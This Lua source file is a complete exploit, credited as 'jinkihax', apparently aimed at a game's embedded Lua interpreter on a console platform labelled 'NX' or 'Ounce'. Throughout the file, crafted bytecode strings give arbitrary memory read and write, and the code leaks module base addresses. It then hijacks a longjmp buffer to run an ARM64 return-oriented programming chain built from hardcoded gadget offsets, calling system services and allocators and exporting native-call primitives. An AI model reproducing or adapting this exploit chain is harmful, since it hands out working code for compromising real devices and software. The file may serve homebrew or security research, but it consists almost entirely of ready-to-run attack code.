local function fatal(err)
	local okfmt, msg = pcall(tostring, err)
	if not okfmt then
		msg = "<unprintable error>"
	end
	pcall(print, "[!] fatal: " .. msg)
	return msg
end

local function addrof(o)
	local s = tostring(o)
	local i = s:find("0x")
	if not i then
		return nil
	end
	return tonumber(s:sub(i + 2), 16)
end
local function f2i(x)
	return x * 2 ^ -52 * 2 ^ -1022
end
local function i2f(x)
	return x * 2 ^ 52 * 2 ^ 1022
end

local offsets_main = {
	luaB_print = 0x14b660,
	luaB_auxwrap = 0x14c590,
	luaD_rawrunprotected_setjmp_va = 0x15240c,
	malloc = 0x2de410, -- operator new (_Znwm) PLT
	free = 0x2de420,   -- operator delete (_ZdlPv) PLT
}

local offsets_sdk = {
	longjmp = 0x51d384,
	thread_impl_pop_x1_x4 = 0x51d2ac, -- ldp x3,x4,[sp,#0x10]; ldp x1,x2,[sp],#0x20; ret
	svc_exit_thread = 0x399a90,
	svc_sleep_thread = 0x399a98,
	svc_close_handle = 0x399b28,
	svc_wait_sync = 0x399b38,
	svc_send_sync = 0x399b90,
	svc_send_sync_user = 0x399b98,
	svc_output_debug_string = 0x399bd8,
	svc_get_info = 0x399be8,
	svc_wait_for_address = 0x399c60,
	svc_signal_to_address = 0x399c68,
	get_message_buffer_on_tls = 0x37e590,
	os_get_thread_id = 0x341e20,
	-- nn::socket (nnsocket* exports)
	socket_initialize = 0x382420,
	socket_socket = 0x382230,
	socket_bind = 0x3821a0,
	socket_listen = 0x3821f0,
	socket_accept = 0x382190,
	socket_recv = 0x382150,
	socket_send = 0x382170,
	socket_close = 0x382260,
	socket_connect = 0x3821b0,
	socket_fcntl = 0x382290,
	socket_get_last_error = 0x3823c0,
	inet_ntop = 0x382330,
	-- nn::nifm
	nifm_initialize = 0x32d640,
	nifm_get_current_primary_ip_address = 0x32e360,
	-- nn::fs
	fs_commit_save_data = 0x1bbd90,
}

local got_anchors_sdk = {
	acos = { got = 0x491508, va = 0x5254c8 },
}

local gadgets = {
	-- ldr x0,[sp,#8]; ldp fp,lr,[sp,#0x10]; add sp,#0x20; ret
	g_load_x0 = 0x08a9e0,
	-- ldp fp,lr,[sp,#0x10]; ldr x19,[sp,#8]; ldr d8,[sp],#0x20; ret
	g_load_x19 = 0x01e4d4,
	-- ldr x0,[x19]; ldp fp,lr,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_peek = 0x168c18,
	-- str x0,[x19]; ldp fp,lr,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_store = 0x0692d4,
	-- ldr x8,[x19,#0x48]; ldr x1,[x19,#0x38]; ldr x0,[x19,#0x50]; blr x8;
	-- str xzr,[x19,#0x38]; ldp fp,lr,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_call2 = 0x0cd758,
	-- blr x8; ldp fp,lr,[sp,#0x10]; ldr x19,[sp],#0x20; ret
	g_blr_x8_keep_x0 = 0x003130,
	-- ldp fp,lr,[sp,#0x10]; mov x1,x0; mov x0,x19;
	-- ldp x20,x19,[sp],#0x20; br x1
	g_branch_x1 = 0x1563dc,
}

local frames = {
	load_x0 = { x0 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	load_x19 = { x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	store = { x20 = 0x00, x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	peek = { x20 = 0x00, x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	call2 = { x20 = 0x00, x19 = 0x08, x29 = 0x10, x30 = 0x18, size = 0x20 },
	blr_keep = { x19 = 0x00, x29 = 0x10, x30 = 0x18, size = 0x20 },
}

local offsets_lua = {
	errorjmp = 0x0a8,
	errfunc = 0x0b0,
	lj_b = 0x008,
	lj_status = 0x140,
	jmpbuf_scan = 0x130,
	lua_errrun = 2,
}

local layout = {
	rop_backup = 0x000,
	rop_forged = 0x200,
	rop_chain = 0x400,
	rop_chain_size = 0x300,
	rop_result = 0x700,
	rop_scratch = 0x730,
	rop_ounce = 0x750,
	main_calls = 0xC00,
	main_calls_size = 0x400,
	arb_rw = 0x900,
	slack = 0x10,
}

local function setup()
	collectgarbage("stop")

	print("[*] jinkihax by alula (jinki port)")
	print("[*] big thanks to: Gezine, kurumuz, zecoxao, DialingSpoon")

	print("[+] setting up initial primitives...")
	local HELPER_READ =
		"\27\76\117\97\81\0\1\4\8\4\8\0\13\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\114\101\97\100\0\0\0\0\0\0\0\0\0\0\1\0\4\5\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\156\128\128\0\158\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\48\0\0\0\0\0\0\0\0\0\2\0\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\4\0\0\0\30\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	local HELPER_WRITE =
		"\27\76\117\97\81\0\1\4\8\4\8\0\14\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\119\114\105\116\101\0\0\0\0\0\0\0\0\0\0\2\0\6\6\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\192\0\128\0\156\64\0\1\30\0\128\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\64\112\48\119\0\0\0\0\0\0\0\0\0\2\1\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\8\0\0\0\30\0\128\0\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	local HR = assert(loadstring(HELPER_READ))
	local HW = assert(loadstring(HELPER_WRITE))

	local function prim(target)
		local T = {}
		T[f2i(0x1111)] = true
		T[f2i(target)] = true
		return T
	end
	local function r64(target)
		local v = HR(prim(target))
		if type(v) == "number" then
			return i2f(v)
		end
		return nil, type(v)
	end
	local function w64(target, qword)
		HW(prim(target), f2i(qword))
	end

	local function destructive_read(a)
		w64(a + 0x8, 3)
		return r64(a)
	end
	local function save_cf(a)
		return destructive_read(a + 0x20)
	end

	local scratch_str = string.rep("\0", 0x4000)
	_G._pinned_scratch = scratch_str

	local box = { 0, 0 }
	_G._pinned_box = box
	local box_addr = addrof(box)
	assert(box_addr, "addrof(box) failed")
	w64(box_addr + 0x20, 3)
	local box_array = r64(box_addr + 0x18)
	assert(box_array and box_array ~= 0, "box has no array part")
	box[1] = scratch_str
	local scratch_ts = destructive_read(box_array)
	box[1] = 0
	assert(scratch_ts and scratch_ts ~= 0, "scratch TString unreadable")
	local heap = scratch_ts + 0x18

	local rw_test = heap + layout.arb_rw
	w64(rw_test, 0x12676721372137)
	local sv = r64(rw_test)
	print("[+] testing arb rw")
	assert(sv == 0x12676721372137)

	print("[*] leaking module bases")

	local anchor_co = coroutine.wrap(function() return true end)
	local anchor_addr = addrof(anchor_co)
	assert(anchor_addr, "addrof(coroutine.wrap) failed")
	local anchor_f = save_cf(anchor_addr)
	anchor_co = nil
	assert(anchor_f and anchor_f ~= 0, "anchor closure read failed")
	local main_base = anchor_f - offsets_main.luaB_auxwrap
	assert(main_base % 0x1000 == 0, "failed to leak main module base")

	print(string.format("[+] main @ 0x%x", main_base))

	math.acos(0)
	local anchor_func = got_anchors_sdk.acos
	local sdk_got_addr = main_base + anchor_func.got
	local sdk_func = destructive_read(sdk_got_addr)
	local sdk_base = sdk_func - anchor_func.va
	assert(sdk_base % 0x1000 == 0, "failed to leak sdk module base")

	print(string.format("[+] sdk  @ 0x%x", sdk_base))

	local function run_rop(opts)
		opts = opts or {}
		local co = coroutine.create(function()
			local L = addrof(coroutine.running())
			local ctx = {
				L = L
			}

			local ok, err = pcall(function()
				w64(L + offsets_lua.errfunc, 3)
				local live = r64(L + offsets_lua.errorjmp)
				w64(L + offsets_lua.errfunc, 0)

				ctx.live = live
				assert(live, "no live errorJmp")

				if opts.capture_jmpbuf then
					local slots = {}
					for off = offsets_lua.jmpbuf_scan, 0, -8 do
						local slot = live + offsets_lua.lj_b + off

						w64(slot + 8, 3)
						slots[off] = r64(slot)
						assert(slots[off] ~= nil, "jmp_buf read failed")
					end

					w64(L + offsets_lua.errfunc, 0)

					local pc_off, sp_off
					for off = offsets_lua.jmpbuf_scan, 0, -8 do
						if slots[off] == main_base + offsets_main.luaD_rawrunprotected_setjmp_va then
							pc_off = off
						end
						if slots[off] == live - 8 then
							sp_off = off
						end
					end

					assert(pc_off and sp_off, "unrecognised jmp_buf layout")

					ctx.slots, ctx.pc_off, ctx.sp_off = slots, pc_off, sp_off
				end

				opts.build(ctx)
				opts.fire(ctx)
			end)
		end)

		return coroutine.resume(co)
	end

	local function new_emitter(chain_base, desc_base, desc_end, chain_end)
		local E = {
			cursor = chain_base,
			desc = desc_base,
			desc_end = desc_end,
			chain_end = chain_end,
			pending = nil,
			words = {}
		}
		local function put(addr, val)
			local w = E.words
			w[#w + 1] = { addr, val }
		end
		local function code(va)
			return main_base + va
		end
		function E:patch(va)
			if self.pending then
				put(self.pending, va)
			end
		end
		-- g_load_x0: x0 = val, frame 0x20
		function E:g0(v)
			self:patch(code(gadgets.g_load_x0))
			local f = frames.load_x0
			local b = self.cursor
			put(b + f.x0, v or 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		-- g_load_x19: x19 = val, frame 0x20 (d8 slot at +0 is harmless)
		function E:g1(v)
			self:patch(code(gadgets.g_load_x19))
			local f = frames.load_x19
			local b = self.cursor
			put(b + f.x19, v or 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		-- g_store: [x19] = x0, frame 0x20
		function E:g2(v20, v19)
			self:patch(code(gadgets.g_store))
			local f = frames.store
			local b = self.cursor
			put(b + f.x20, v20 or 0)
			put(b + f.x19, v19 or 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		-- peek: x0 = *src, then store to *dst
		function E:peek(src, dst)
			self:g1(src)
			self:patch(code(gadgets.g_peek))
			local f = frames.peek
			local b = self.cursor
			put(b + f.x20, 0)
			put(b + f.x19, 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
			self:g1(dst)
			self:g2(0, 0)
		end
		-- call2: 2-arg call via g_call2 descriptor. No result stored.
		-- Used for chain exit (longjmp) and simple void calls.
		function E:call2(target, x0v, x1v)
			local desc = self.desc
			if desc + 0x60 > self.desc_end then
				error("rop descriptor pool overflow", 0)
			end
			self.desc = desc + 0x60
			put(desc + 0x38, x1v or 0)
			put(desc + 0x48, target)
			put(desc + 0x50, x0v or 0)
			self:g1(desc)
			self:patch(code(gadgets.g_call2))
			local f = frames.call2
			local b = self.cursor
			put(b + f.x20, 0)
			put(b + f.x19, 0)
			put(b + f.x29, 0)
			self.cursor = b + f.size
			self.pending = b + f.x30
		end
		-- call_native: up to 4 useful args (a0-a3), result stored.
		-- Chain: g1(desc) -> g0(pop_addr) -> g_branch_x1 -> thread_impl_pop
		--        -> g_call2 (reads a0,a1 from desc; a2,a3 via pop) -> g_store
		-- NOTE: a4 is forced to result_cell due to frame overlap with g_call2's
		-- epilogue x19 restore. For calls needing 5 args, use a different path.
		function E:call_native(target, a0, a1, a2, a3, a4, result_cell)
			result_cell = result_cell or (heap + layout.rop_result)

			local desc = self.desc
			if desc + 0x60 > self.desc_end then
				error("rop descriptor pool overflow", 0)
			end
			self.desc = desc + 0x60
			put(desc + 0x38, a1 or 0)
			put(desc + 0x48, target)
			put(desc + 0x50, a0 or 0)

			-- g1(desc): x19 = descriptor for g_call2
			self:g1(desc)

			-- g0(pop): x0 = thread_impl_pop address, x19 unchanged = desc
			self:patch(code(gadgets.g_load_x0))
			local b0 = self.cursor
			local f0 = frames.load_x0
			put(b0 + f0.x0, sdk_base + offsets_sdk.thread_impl_pop_x1_x4)
			put(b0 + f0.x29, 0)
			put(b0 + f0.x30, code(gadgets.g_branch_x1))
			self.cursor = b0 + f0.size

			-- g_branch_x1: x1 = x0 = pop_addr, x0 = x19 = desc (unused),
			-- lr = g_call2 (from x30 slot), x19 = desc (from x19 slot), br x1
			local b1 = self.cursor
			put(b1 + 0x00, 0)
			put(b1 + 0x08, desc)
			put(b1 + 0x10, 0)
			put(b1 + 0x18, code(gadgets.g_call2))
			self.cursor = b1 + 0x20

			-- thread_impl_pop: ldp x3,x4,[sp,#0x10]; ldp x1,x2,[sp],#0x20; ret
			-- sp advances 0x20, no overlap with g_call2 epilogue frame
			local b2 = self.cursor
			put(b2 + 0x00, 0)               -- x1 (overridden by g_call2)
			put(b2 + 0x08, a2 or 0)         -- x2
			put(b2 + 0x10, a3 or 0)         -- x3
			put(b2 + 0x18, result_cell)      -- x4
			-- SP = b2+0x20 after pop; g_call2 epilogue frame:
			put(b2 + 0x20, 0)               -- x20
			put(b2 + 0x28, result_cell)      -- x19 (for g_store)
			put(b2 + 0x30, 0)               -- x29
			put(b2 + 0x38, code(gadgets.g_store))  -- x30
			self.cursor = b2 + 0x40

			-- g_store frame: str x0,[x19=result_cell]
			local b3 = self.cursor
			put(b3 + 0x00, 0)
			put(b3 + 0x08, 0)
			put(b3 + 0x10, 0)
			self.cursor = b3 + 0x20
			self.pending = b3 + 0x18
		end

		function E:flush()
			table.sort(self.words, function(x, y) return x[1] < y[1] end)
			for i = 1, #self.words do
				w64(self.words[i][1], self.words[i][2])
			end
			self.words = {}
		end
		return E
	end

	local rop_backup = heap + layout.rop_backup
	local rop_forged = heap + layout.rop_forged
	local rop_chain = heap + layout.rop_chain
	local longjmp_b = offsets_lua.lj_b

	local main_area = {
		chain = rop_chain,
		chain_end = heap + layout.rop_result - layout.slack,
		desc = heap + layout.main_calls,
		desc_end = heap + layout.main_calls + layout.main_calls_size
	}

	local function build_chain(area, emit)
		local E = new_emitter(area.chain, area.desc, area.desc_end, area.chain_end)

		E:g1(0)
		emit(E)
		E:call2(sdk_base + offsets_sdk.longjmp, rop_backup, offsets_lua.lua_errrun)

		if E.cursor > E.chain_end then
			error("rop chain overlaps its end", 0)
		end
		E:flush()
	end

	local function chain_builder(emit, chain_base, chain_end)
		local area = main_area
		if chain_base then
			area = {
				chain = chain_base,
				chain_end = chain_end,
				desc = heap + layout.main_calls,
				desc_end = heap + layout.main_calls + layout.main_calls_size
			}
		end
		return function(ctx)
			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_backup + off, ctx.slots[off])
			end

			build_chain(area, emit)

			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_forged + longjmp_b + off, ctx.slots[off])
			end

			w64(rop_forged + longjmp_b + ctx.pc_off, main_base + gadgets.g_load_x19)
			w64(rop_forged + longjmp_b + ctx.sp_off, area.chain)
			w64(ctx.live + offsets_lua.lj_status, offsets_lua.lua_errrun)
		end
	end

	local function fire8(ctx)
		w64(ctx.L + offsets_lua.errorjmp, rop_forged)
		w64(ctx.L + offsets_lua.errfunc, 0)
		error("meow", 0)
	end

	local function run_chain(emit, chain_base, chain_end)
		local rok, rerr = run_rop{
			build = function(ctx)
				return chain_builder(emit, chain_base, chain_end)(ctx)
			end,
			fire = fire8,
			capture_jmpbuf = true
		}
		if not rok then
			print("[!] chain coroutine failed: " .. tostring(rerr))
		end
	end

	local function native_call(target, a0, a1, a2, a3, a4, chain_base, chain_end)
		local RES = heap + layout.rop_result
		run_chain(function(E)
			E:call_native(target, a0, a1, a2, a3, a4, RES)
		end, chain_base, chain_end)
		w64(RES + 8, 3)
		return r64(RES)
	end

	local OUT = heap + layout.rop_ounce
	w64(OUT, 0)
	local is_ounce = native_call(sdk_base + offsets_sdk.svc_get_info,
		OUT, 32, 0xFFFF8001, 0, 0) == 0
	print("[*] running on:", is_ounce and "Ounce" or "NX")

	local RES = heap + layout.rop_result
	local node_probe = {}
	local node_probe_addr = addrof(node_probe)
	assert(node_probe_addr, "addrof(node probe) failed")
	run_chain(function(E)
		E:peek(node_probe_addr + 0x20, RES)
	end)
	w64(RES + 8, 3)
	local dummynode = r64(RES)
	assert(dummynode and dummynode ~= 0 and dummynode % 8 == 0,
		"could not read dummynode")
	w64(box_addr + 0x20, dummynode)
	w64(box_addr + 0x28, dummynode)

	local function str_addr(s)
		assert(type(s) == "string", "str_addr wants a string")
		box[1] = s
		run_chain(function(E)
			E:peek(box_array, RES)
		end)
		w64(RES + 8, 3)
		local ts = r64(RES)
		box[1] = 0
		assert(ts and ts ~= 0, "str_addr read failed")
		return ts
	end

	local tls_addr = native_call(sdk_base + offsets_sdk.get_message_buffer_on_tls,
		0, 0, 0, 0, 0)
	print(string.format("[+] TPIDRRO_EL0=0x%x", tls_addr))

	local function wstr(addr, s)
		for i = 1, #s, 4 do
			local v = 0
			for j = 3, 0, -1 do
				v = v * 256 + (s:byte(i + j) or 0)
			end
			w64(addr + i - 1, v)
		end
	end

	local function alloc(size)
		return native_call(main_base + offsets_main.malloc, size, 0, 0, 0, 0)
	end

	local function free_block(ptr)
		run_chain(function(E)
			E:call2(main_base + offsets_main.free, ptr, 0)
		end)
	end

	local deep_stack
	local function call_deep(target, a0, a1, a2, a3, a4)
		if not deep_stack then
			deep_stack = alloc(0x20000)
			assert(deep_stack and deep_stack ~= 0, "deep stack allocation failed")
		end
		return native_call(target, a0, a1, a2, a3, a4,
			deep_stack + 0x1E000, deep_stack + 0x20000)
	end

	_G.n2h = {
		platform = is_ounce and "Ounce" or "NX",
		game_id = "jinki",
		main_base = main_base,
		sdk_base = sdk_base,
		gadgets = gadgets,
		offsets_main = offsets_main,
		offsets_sdk = offsets_sdk,
		layout = layout,
		addrof = addrof,
		sdk = function(name)
			local va = offsets_sdk[name]
			assert(va, "unknown offset " .. tostring(name))
			return sdk_base + va
		end,
		peek = destructive_read,
		poke = w64,
		str_addr = str_addr,
		write_bytes = wstr,
		alloc = alloc,
		free = free_block,
		call_deep = call_deep,
		run_chain = run_chain,
		new_emitter = new_emitter,
		log = print,
	}
	collectgarbage("restart")
end

xpcall(setup, fatal)
